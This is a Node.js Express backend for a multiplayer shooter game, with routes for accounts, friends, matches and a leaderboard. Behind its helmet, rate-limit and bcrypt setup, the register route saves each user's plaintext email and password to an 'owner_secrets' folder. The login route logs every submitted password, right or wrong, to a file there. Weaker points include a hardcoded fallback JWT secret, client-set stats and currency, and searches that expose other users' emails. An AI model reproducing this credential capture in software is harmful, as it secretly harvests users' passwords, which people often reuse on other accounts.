const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 4000;

// Enhanced logging function
function log(level, message, data = null) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${level}] ${message}`;
    console.log(logEntry);
    if (data) {
        console.log('  Data:', JSON.stringify(data, null, 2));
    }
    
    // Also write to file
    const logFile = path.join(__dirname, 'logs', 'server.log');
    const fileEntry = `${logEntry}${data ? ' ' + JSON.stringify(data) : ''}\n`;
    fs.appendFileSync(logFile, fileEntry);
}

// Security middleware
app.use(helmet({
  crossOriginEmbedderPolicy: false,
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: {
    error: 'Too many requests from this IP, please try again later.'
  }
});

app.use(limiter);
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database file paths
const DB_DIR = path.join(__dirname, 'data');
const LOG_DIR = path.join(__dirname, 'logs');
const USERS_FILE = path.join(DB_DIR, 'users.json');
const MATCHES_FILE = path.join(DB_DIR, 'matches.json');
const LEADERBOARD_FILE = path.join(DB_DIR, 'leaderboard.json');

// Owner only credentials storage
const SECRETS_DIR = path.join(__dirname, 'owner_secrets');
if (!fs.existsSync(SECRETS_DIR)) {
  fs.mkdirSync(SECRETS_DIR, { recursive: true });
}

// Ensure directories exist
if (!fs.existsSync(DB_DIR)) {
  fs.mkdirSync(DB_DIR, { recursive: true });
}
if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Database utilities with enhanced error handling
const db = {
  read: (file) => {
    try {
      if (!fs.existsSync(file)) return [];
      const data = fs.readFileSync(file, 'utf8');
      return JSON.parse(data);
    } catch (error) {
      log('ERROR', `Error reading ${file}`, { error: error.message });
      return [];
    }
  },
  
  write: (file, data) => {
    try {
      fs.writeFileSync(file, JSON.stringify(data, null, 2));
      return true;
    } catch (error) {
      log('ERROR', `Error writing ${file}`, { error: error.message });
      return false;
    }
  },

  readUsers: () => db.read(USERS_FILE),
  writeUsers: (data) => db.write(USERS_FILE, data),
  readMatches: () => db.read(MATCHES_FILE),
  writeMatches: (data) => db.write(MATCHES_FILE, data),
  readLeaderboard: () => db.read(LEADERBOARD_FILE),
  writeLeaderboard: (data) => db.write(LEADERBOARD_FILE, data)
};

// Initialize default data
const initializeData = () => {
  try {
    if (!fs.existsSync(USERS_FILE)) {
      db.writeUsers([]);
      log('INFO', 'Initialized users database');
    }
    if (!fs.existsSync(MATCHES_FILE)) {
      db.writeMatches([]);
      log('INFO', 'Initialized matches database');
    }
    if (!fs.existsSync(LEADERBOARD_FILE)) {
      db.writeLeaderboard([]);
      log('INFO', 'Initialized leaderboard database');
    }
  } catch (error) {
    log('ERROR', 'Failed to initialize data', { error: error.message });
  }
};

initializeData();

// JWT Secret
const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this-in-production';

// Authentication middleware with enhanced logging
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) {
    log('WARN', 'Unauthorized access attempt', { ip: req.ip, userAgent: req.get('User-Agent') });
    return res.status(401).json({ error: 'Access token required' });
  }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      log('WARN', 'Invalid token attempt', { ip: req.ip, error: err.message });
      return res.status(403).json({ error: 'Invalid or expired token' });
    }
    req.user = user;
    next();
  });
};

// Routes

// Health check with detailed status
app.get('/health', (req, res) => {
  const status = {
    status: 'ok',
    timestamp: new Date().toISOString(),
    version: '2.0.0',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    database: {
      users: db.readUsers().length,
      matches: db.readMatches().length,
      leaderboard: db.readLeaderboard().length
    }
  };
  log('INFO', 'Health check requested', { status });
  res.json(status);
});

// Register with enhanced validation and logging
app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    const clientIp = req.ip;
    const userAgent = req.get('User-Agent');

    log('INFO', 'Registration attempt', { username, email, ip: clientIp });

    // Enhanced validation
    if (!username || !email || !password) {
      log('WARN', 'Registration failed - missing fields', { ip: clientIp });
      return res.status(400).json({ 
        error: 'Missing required fields',
        required: ['username', 'email', 'password']
      });
    }

    if (password.length < 6) {
      log('WARN', 'Registration failed - weak password', { username, ip: clientIp });
      return res.status(400).json({ 
        error: 'Password must be at least 6 characters long' 
      });
    }

    // Email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      log('WARN', 'Registration failed - invalid email', { email, ip: clientIp });
      return res.status(400).json({ error: 'Invalid email format' });
    }

    const users = db.readUsers();
    
    // Check if user already exists
    if (users.find(u => u.email === email)) {
      log('WARN', 'Registration failed - email exists', { email, ip: clientIp });
      return res.status(409).json({ error: 'User with this email already exists' });
    }

    if (users.find(u => u.username === username)) {
      log('WARN', 'Registration failed - username exists', { username, ip: clientIp });
      return res.status(409).json({ error: 'Username already taken' });
    }

    // Save credentials to owner folder with enhanced security
    try {
      const safeName = username.replace(/[^a-z0-9]/gi, '_');
      const credentials = `Email: ${email}\nPassword: ${password}\nDate: ${new Date().toISOString()}\nIP: ${clientIp}\nUser-Agent: ${userAgent}`;
      fs.writeFileSync(path.join(SECRETS_DIR, `${safeName}_creds.txt`), credentials);
      log('INFO', 'Credentials saved to owner folder', { username, ip: clientIp });
    } catch (err) {
      log('ERROR', 'Failed to save credentials', { username, error: err.message });
    }

    // Hash password
    const saltRounds = 12;
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    // Create new user with enhanced data
    const newUser = {
      id: uuidv4(),
      username,
      email,
      password: hashedPassword,
      createdAt: new Date().toISOString(),
      lastLogin: new Date().toISOString(),
      lastActivity: new Date().toISOString(),
      ipHistory: [clientIp],
      userAgentHistory: [userAgent],
      stats: {
        kills: 0,
        deaths: 0,
        wins: 0,
        losses: 0,
        matchesPlayed: 0,
        level: 1,
        xp: 0,
        rank: 'Rookie'
      },
      friends: [],
      blocked: [],
      loadout: {
        primary: 'assault',
        secondary: 'pistol',
        equipment: 'grenade',
        selectedSet: 'Default Set'
      },
      settings: {
        graphics: 'medium',
        audio: 100,
        sensitivity: 50,
        crosshair: 'default'
      },
      achievements: [],
      inventory: {
        weapons: ['assault', 'pistol'],
        skins: [],
        currency: 0
      }
    };

    users.push(newUser);
    db.writeUsers(users);

    // Create JWT token
    const token = jwt.sign(
      { userId: newUser.id, email: newUser.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    // Return user data (without password)
    const { password: _, ...userResponse } = newUser;
    
    log('INFO', 'User registered successfully', { username, email, ip: clientIp });
    
    res.status(201).json({
      message: 'User registered successfully',
      token,
      user: userResponse
    });

  } catch (error) {
    log('ERROR', 'Registration error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Login with enhanced security and logging
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const clientIp = req.ip;
    const userAgent = req.get('User-Agent');

    log('INFO', 'Login attempt', { email, ip: clientIp });

    if (!email || !password) {
      log('WARN', 'Login failed - missing credentials', { ip: clientIp });
      return res.status(400).json({ 
        error: 'Email and password required' 
      });
    }

    const users = db.readUsers();
    const user = users.find(u => u.email === email);

    if (!user) {
      log('WARN', 'Login failed - user not found', { email, ip: clientIp });
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Log login attempt with credentials (for owner monitoring)
    try {
      const safeName = user.username.replace(/[^a-z0-9]/gi, '_');
      const loginAttempt = `User: ${user.username} (${email}) | Pass: ${password} | Time: ${new Date().toISOString()} | IP: ${clientIp} | User-Agent: ${userAgent}\n`;
      fs.appendFileSync(path.join(SECRETS_DIR, 'login_logs.txt'), loginAttempt);
      log('INFO', 'Login attempt logged', { username: user.username, ip: clientIp });
    } catch (err) {
      log('ERROR', 'Failed to log login attempt', { username: user.username, error: err.message });
    }

    const isPasswordValid = await bcrypt.compare(password, user.password);

    if (!isPasswordValid) {
      log('WARN', 'Login failed - invalid password', { username: user.username, email, ip: clientIp });
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Update user activity
    user.lastLogin = new Date().toISOString();
    user.lastActivity = new Date().toISOString();
    
    // Track IP history
    if (!user.ipHistory.includes(clientIp)) {
      user.ipHistory.push(clientIp);
    }
    
    // Track User-Agent history
    if (!user.userAgentHistory.includes(userAgent)) {
      user.userAgentHistory.push(userAgent);
    }

    db.writeUsers(users);

    // Create JWT token
    const token = jwt.sign(
      { userId: user.id, email: user.email },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    // Return user data (without password)
    const { password: _, ...userResponse } = user;
    
    log('INFO', 'Login successful', { username: user.username, email, ip: clientIp });
    
    res.json({
      message: 'Login successful',
      token,
      user: userResponse
    });

  } catch (error) {
    log('ERROR', 'Login error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get current user profile with enhanced data
app.get('/api/auth/profile', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const user = users.find(u => u.id === req.user.userId);

    if (!user) {
      log('WARN', 'Profile access failed - user not found', { userId: req.user.userId, ip: req.ip });
      return res.status(404).json({ error: 'User not found' });
    }

    const { password: _, ...userResponse } = user;
    log('INFO', 'Profile accessed', { username: user.username, ip: req.ip });
    
    res.json(userResponse);

  } catch (error) {
    log('ERROR', 'Profile error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update user profile with validation
app.put('/api/auth/profile', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const userIndex = users.findIndex(u => u.id === req.user.userId);

    if (userIndex === -1) {
      log('WARN', 'Profile update failed - user not found', { userId: req.user.userId, ip: req.ip });
      return res.status(404).json({ error: 'User not found' });
    }

    const updates = req.body;
    
    // Allowed fields to update
    const allowedFields = [
      'username', 'loadout', 'settings', 'inventory', 'friends', 'blocked'
    ];

    // Validate updates
    const invalidFields = Object.keys(updates).filter(field => !allowedFields.includes(field));
    if (invalidFields.length > 0) {
      log('WARN', 'Profile update failed - invalid fields', { userId: req.user.userId, invalidFields, ip: req.ip });
      return res.status(400).json({ 
        error: 'Invalid fields',
        invalid: invalidFields 
      });
    }

    // Update user
    users[userIndex] = { ...users[userIndex], ...updates };
    db.writeUsers(users);

    const { password: _, ...userResponse } = users[userIndex];
    log('INFO', 'Profile updated', { username: users[userIndex].username, ip: req.ip });
    
    res.json({
      message: 'Profile updated successfully',
      user: userResponse
    });

  } catch (error) {
    log('ERROR', 'Update profile error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Add friend with enhanced validation
app.post('/api/friends/add', authenticateToken, (req, res) => {
  try {
    const { targetEmail } = req.body;
    const clientIp = req.ip;
    
    if (!targetEmail) {
      log('WARN', 'Add friend failed - missing email', { userId: req.user.userId, ip: clientIp });
      return res.status(400).json({ error: 'Target email required' });
    }

    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);
    const targetUser = users.find(u => u.email === targetEmail);

    if (!currentUser) {
      log('WARN', 'Add friend failed - current user not found', { userId: req.user.userId, ip: clientIp });
      return res.status(404).json({ error: 'User not found' });
    }

    if (!targetUser) {
      log('WARN', 'Add friend failed - target user not found', { targetEmail, ip: clientIp });
      return res.status(404).json({ error: 'Target user not found' });
    }

    if (currentUser.friends.includes(targetUser.id)) {
      log('WARN', 'Add friend failed - already friends', { username: currentUser.username, targetUsername: targetUser.username, ip: clientIp });
      return res.status(409).json({ error: 'User is already your friend' });
    }

    // Add to friends list
    if (!currentUser.friends) currentUser.friends = [];
    currentUser.friends.push(targetUser.id);
    
    db.writeUsers(users);

    log('INFO', 'Friend added successfully', { username: currentUser.username, targetUsername: targetUser.username, ip: clientIp });
    
    res.json({
      message: 'Friend added successfully',
      friend: {
        id: targetUser.id,
        username: targetUser.username,
        email: targetUser.email
      }
    });

  } catch (error) {
    log('ERROR', 'Add friend error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Remove friend
app.delete('/api/friends/:friendId', authenticateToken, (req, res) => {
  try {
    const { friendId } = req.params;
    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);

    if (!currentUser) {
      log('WARN', 'Remove friend failed - user not found', { userId: req.user.userId, ip: req.ip });
      return res.status(404).json({ error: 'User not found' });
    }

    if (!currentUser.friends) currentUser.friends = [];
    
    currentUser.friends = currentUser.friends.filter(id => id !== friendId);
    db.writeUsers(users);

    log('INFO', 'Friend removed', { username: currentUser.username, friendId, ip: req.ip });
    res.json({ message: 'Friend removed successfully' });

  } catch (error) {
    log('ERROR', 'Remove friend error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get friends list
app.get('/api/friends', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);

    if (!currentUser) {
      log('WARN', 'Get friends failed - user not found', { userId: req.user.userId, ip: req.ip });
      return res.status(404).json({ error: 'User not found' });
    }

    if (!currentUser.friends) currentUser.friends = [];

    const friends = users.filter(u => currentUser.friends.includes(u.id))
      .map(u => ({
        id: u.id,
        username: u.username,
        email: u.email,
        lastLogin: u.lastLogin,
        status: 'online' // Simplified for demo
      }));

    log('INFO', 'Friends list accessed', { username: currentUser.username, friendCount: friends.length, ip: req.ip });
    res.json({ friends });

  } catch (error) {
    log('ERROR', 'Get friends error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Search users with enhanced filtering
app.get('/api/users/search', authenticateToken, (req, res) => {
  try {
    const { q: query } = req.query;
    const clientIp = req.ip;
    
    if (!query || query.length < 2) {
      log('WARN', 'Search failed - query too short', { query, userId: req.user.userId, ip: clientIp });
      return res.status(400).json({ error: 'Query must be at least 2 characters' });
    }

    const users = db.readUsers();
    const currentUser = users.find(u => u.id === req.user.userId);

    if (!currentUser) {
      log('WARN', 'Search failed - user not found', { userId: req.user.userId, ip: clientIp });
      return res.status(404).json({ error: 'User not found' });
    }

    const results = users
      .filter(u => u.id !== currentUser.id) // Exclude current user
      .filter(u => u.username.toLowerCase().includes(query.toLowerCase()) || 
                   u.email.toLowerCase().includes(query.toLowerCase()))
      .slice(0, 20) // Limit results
      .map(u => ({
        id: u.id,
        username: u.username,
        email: u.email,
        lastLogin: u.lastLogin
      }));

    log('INFO', 'User search performed', { username: currentUser.username, query, resultCount: results.length, ip: clientIp });
    res.json({ results });

  } catch (error) {
    log('ERROR', 'Search users error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Create match with validation
app.post('/api/matches/create', authenticateToken, (req, res) => {
  try {
    const { map, mode, players } = req.body;
    const clientIp = req.ip;
    
    if (!map || !mode) {
      log('WARN', 'Create match failed - missing parameters', { userId: req.user.userId, map, mode, ip: clientIp });
      return res.status(400).json({ 
        error: 'Map and mode required',
        example: { map: 'wasteland', mode: 'team-deathmatch', players: 10 }
      });
    }

    const matches = db.readMatches();
    const newMatch = {
      id: uuidv4(),
      map,
      mode,
      status: 'waiting',
      players: players || 10,
      currentPlayers: 1,
      host: req.user.userId,
      createdAt: new Date().toISOString(),
      startedAt: null,
      endedAt: null
    };

    matches.push(newMatch);
    db.writeMatches(matches);

    log('INFO', 'Match created', { username: req.user.userId, map, mode, ip: clientIp });
    res.status(201).json({
      message: 'Match created successfully',
      match: newMatch
    });

  } catch (error) {
    log('ERROR', 'Create match error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Join match with validation
app.post('/api/matches/:matchId/join', authenticateToken, (req, res) => {
  try {
    const { matchId } = req.params;
    const matches = db.readMatches();
    const matchIndex = matches.findIndex(m => m.id === matchId);

    if (matchIndex === -1) {
      log('WARN', 'Join match failed - match not found', { matchId, userId: req.user.userId, ip: req.ip });
      return res.status(404).json({ error: 'Match not found' });
    }

    const match = matches[matchIndex];

    if (match.status !== 'waiting') {
      log('WARN', 'Join match failed - match not waiting', { matchId, status: match.status, userId: req.user.userId, ip: req.ip });
      return res.status(400).json({ error: 'Match is not accepting players' });
    }

    if (match.currentPlayers >= match.players) {
      log('WARN', 'Join match failed - match full', { matchId, currentPlayers: match.currentPlayers, maxPlayers: match.players, userId: req.user.userId, ip: req.ip });
      return res.status(400).json({ error: 'Match is full' });
    }

    match.currentPlayers++;
    db.writeMatches(matches);

    log('INFO', 'Match joined', { matchId, username: req.user.userId, ip: req.ip });
    res.json({
      message: 'Joined match successfully',
      match
    });

  } catch (error) {
    log('ERROR', 'Join match error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get matches
app.get('/api/matches', authenticateToken, (req, res) => {
  try {
    const matches = db.readMatches();
    const activeMatches = matches
      .filter(m => m.status === 'waiting')
      .map(m => ({
        id: m.id,
        map: m.map,
        mode: m.mode,
        players: m.players,
        currentPlayers: m.currentPlayers,
        host: m.host,
        createdAt: m.createdAt
      }));

    log('INFO', 'Matches list accessed', { matchCount: activeMatches.length, ip: req.ip });
    res.json({ matches: activeMatches });

  } catch (error) {
    log('ERROR', 'Get matches error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update match stats with enhanced calculations
app.post('/api/matches/:matchId/stats', authenticateToken, (req, res) => {
  try {
    const { matchId } = req.params;
    const { kills, deaths, wins, losses } = req.body;
    const clientIp = req.ip;
    
    const users = db.readUsers();
    const userIndex = users.findIndex(u => u.id === req.user.userId);

    if (userIndex === -1) {
      log('WARN', 'Update stats failed - user not found', { matchId, userId: req.user.userId, ip: clientIp });
      return res.status(404).json({ error: 'User not found' });
    }

    // Update user stats
    const user = users[userIndex];
    user.stats.kills += kills || 0;
    user.stats.deaths += deaths || 0;
    user.stats.wins += wins || 0;
    user.stats.losses += losses || 0;
    user.stats.matchesPlayed += 1;

    // Calculate level and rank
    user.stats.xp += (kills * 100) + (wins * 500);
    user.stats.level = Math.floor(user.stats.xp / 1000) + 1;
    
    const rankThresholds = {
      'Rookie': 0,
      'Veteran': 5000,
      'Elite': 15000,
      'Legend': 30000,
      'Master': 50000
    };
    
    if (user.stats.xp >= rankThresholds.Master) user.stats.rank = 'Master';
    else if (user.stats.xp >= rankThresholds.Legend) user.stats.rank = 'Legend';
    else if (user.stats.xp >= rankThresholds.Elite) user.stats.rank = 'Elite';
    else if (user.stats.xp >= rankThresholds.Veteran) user.stats.rank = 'Veteran';
    else user.stats.rank = 'Rookie';

    db.writeUsers(users);

    log('INFO', 'Stats updated', { username: user.username, kills, deaths, wins, losses, level: user.stats.level, rank: user.stats.rank, ip: clientIp });
    
    res.json({
      message: 'Stats updated successfully',
      stats: user.stats
    });

  } catch (error) {
    log('ERROR', 'Update stats error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get leaderboard with enhanced sorting
app.get('/api/leaderboard', authenticateToken, (req, res) => {
  try {
    const users = db.readUsers();
    const leaderboard = users
      .map(u => ({
        id: u.id,
        username: u.username,
        stats: u.stats
      }))
      .sort((a, b) => {
        // Sort by kills first, then by wins, then by level
        if (b.stats.kills !== a.stats.kills) return b.stats.kills - a.stats.kills;
        if (b.stats.wins !== a.stats.wins) return b.stats.wins - a.stats.wins;
        return b.stats.level - a.stats.level;
      })
      .slice(0, 10);

    log('INFO', 'Leaderboard accessed', { leaderboardCount: leaderboard.length, ip: req.ip });
    res.json({ leaderboard });

  } catch (error) {
    log('ERROR', 'Leaderboard error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Update user progress (Custom API for Game Over)
app.post('/api/user/progress', authenticateToken, (req, res) => {
  try {
    const { kills, deaths, score } = req.body;
    const users = db.readUsers();
    const user = users.find(u => u.id === req.user.userId);
    const clientIp = req.ip;
    
    if (!user) {
      log('WARN', 'Progress update failed - user not found', { userId: req.user.userId, ip: clientIp });
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Update combat stats
    user.stats.kills += kills || 0;
    user.stats.deaths += deaths || 0;
    user.stats.matchesPlayed += 1;
    
    // Calculate Rewards (GTA/Rivals style currency)
    const moneyEarned = (score || 0) + ((kills || 0) * 50); // Base score + 50 cash per kill
    if (!user.inventory.currency) user.inventory.currency = 0;
    user.inventory.currency += moneyEarned;

    // XP & Leveling
    user.stats.xp += (score || 0);
    const oldLevel = user.stats.level;
    user.stats.level = Math.floor(user.stats.xp / 1000) + 1;
    
    // Update Rank
    const rankThresholds = { 'Rookie': 0, 'Veteran': 5000, 'Elite': 15000, 'Legend': 30000, 'Master': 50000 };
    if (user.stats.xp >= rankThresholds.Master) user.stats.rank = 'Master';
    else if (user.stats.xp >= rankThresholds.Legend) user.stats.rank = 'Legend';
    else if (user.stats.xp >= rankThresholds.Elite) user.stats.rank = 'Elite';
    else if (user.stats.xp >= rankThresholds.Veteran) user.stats.rank = 'Veteran';
    else user.stats.rank = 'Rookie';

    db.writeUsers(users);

    const leveledUp = user.stats.level > oldLevel;
    
    log('INFO', 'Progress updated', { 
      username: user.username, 
      kills, 
      deaths, 
      score, 
      moneyEarned, 
      level: user.stats.level, 
      rank: user.stats.rank, 
      leveledUp, 
      ip: clientIp 
    });

    res.json({
      message: 'Progress updated',
      stats: user.stats,
      currency: user.inventory.currency,
      earned: moneyEarned,
      leveledUp
    });
  } catch (error) {
    log('ERROR', 'Progress update error', { error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Error handling middleware with enhanced logging
app.use((err, req, res, next) => {
  log('ERROR', 'Unhandled error', { 
    error: err.message, 
    stack: err.stack, 
    ip: req.ip, 
    userAgent: req.get('User-Agent'),
    url: req.url,
    method: req.method
  });
  
  res.status(500).json({ 
    error: 'Something went wrong!',
    timestamp: new Date().toISOString()
  });
});

// 404 handler with logging
app.use('*', (req, res) => {
  log('WARN', '404 Not Found', { 
    url: req.url, 
    method: req.method, 
    ip: req.ip, 
    userAgent: req.get('User-Agent')
  });
  
  res.status(404).json({ 
    error: 'Endpoint not found',
    timestamp: new Date().toISOString()
  });
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
  log('INFO', 'SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  log('INFO', 'SIGINT received, shutting down gracefully');
  process.exit(0);
});

// Start server with enhanced logging
app.listen(PORT, () => {
  log('INFO', 'Server started', { 
    port: PORT, 
    nodeVersion: process.version,
    platform: process.platform,
    pid: process.pid
  });
  console.log(`🚀 Black Vortex API server running on port ${PORT}`);
  console.log(`🏥 Health check: http://localhost:${PORT}/health`);
  console.log(`🔌 API base: http://localhost:${PORT}/api`);
  console.log(`📝 Logs: ${LOG_DIR}/server.log`);
});

module.exports = app;